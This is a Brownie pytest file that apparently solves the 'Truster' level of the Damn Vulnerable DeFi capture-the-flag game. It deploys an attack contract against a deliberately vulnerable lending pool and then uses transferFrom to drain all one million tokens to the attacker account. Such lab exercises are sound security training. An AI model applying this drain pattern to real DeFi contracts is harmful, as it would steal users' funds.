import pytest
import brownie
from brownie import DamnValuableToken, TrusterLenderPool, AttackTruster
from brownie import accounts , Wei , exceptions

deployer, attacker = None, None

# Pool has 1M * 10**18 tokens
TOKENS_IN_POOL = Wei('1_000_000 ether')  

#--  [ SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE ] --#
@pytest.fixture(scope="module")
def contracts():

    global deployer, attacker
    deployer, attacker = accounts[0] ,accounts[1]

    contracts = {}

    token = DamnValuableToken.deploy( {"from":deployer})
    pool = TrusterLenderPool.deploy(token.address,  {"from":deployer})

    token.transfer(pool.address, TOKENS_IN_POOL)

    assert token.balanceOf(pool.address) == TOKENS_IN_POOL
    assert token.balanceOf(attacker.address) == 0

    contracts['token'] = token
    contracts['pool'] = pool

    yield contracts

    #---  [ SUCCESS CONDITIONS ]  ---#
    # Attacker has taken all tokens from the pool
    assert token.balanceOf(attacker.address) == TOKENS_IN_POOL
    assert token.balanceOf(pool.address) == '0'


def test_truster_challenge(contracts):
    #-- [ CODE YOUR EXPLOIT HERE ] ---#
    
    attackTruster = AttackTruster.deploy(
        contracts["pool"].address,
        contracts["token"].address,
        {"from":attacker}
    )

    tx = attackTruster.attack(
            '0',
            attacker.address,
            TOKENS_IN_POOL,
            {"from":attacker}
        )
    tx.wait(1)

    contracts["token"].transferFrom(
        contracts["pool"].address, 
        attacker.address, 
        TOKENS_IN_POOL,
        {"from":attacker}
    )
    #_________________________________#
